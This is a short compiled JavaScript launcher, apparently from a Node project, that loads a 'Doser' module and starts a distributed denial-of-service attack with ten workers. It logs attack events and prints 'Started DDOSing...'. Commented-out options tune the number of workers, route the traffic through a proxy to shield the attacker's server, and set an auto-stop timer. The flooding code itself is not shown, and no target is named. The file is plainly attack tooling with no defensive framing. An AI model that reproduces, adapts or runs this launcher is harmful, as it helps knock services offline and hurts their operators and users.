"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
var doser_1 = require("./doser");
// Tutorial: https://khalilstemmler.com/blogs/typescript/node-starter-project/
// https://blog.appsignal.com/2022/01/19/how-to-set-up-a-nodejs-project-with-typescript.html
// const args = process.argv;
// console.log('Script started: ', args);
var timeout = undefined;
function start() {
    var doser = new doser_1.Doser(true, 10); //32
    doser.listen('atack', function (data) { return console.log("Attack: ", data.log); });
    doser.listen('error', function (data) { return console.log("Error: ", data.log); });
    // doser.forceProxy(true); // Use proxy to save the server
    // doser.setWorkersCount(32); // Count of workers
    console.log('Started DDOSing...');
    doser.start(); //Start DDOSing
    // Turn this script off after some time
    // If this is commented out then script will work forever
    // timeout = setTimeout(() => {
    //   doser.stop();
    //   console.log('Stopped DDOSing...')
    // }, 15000)
}
start();
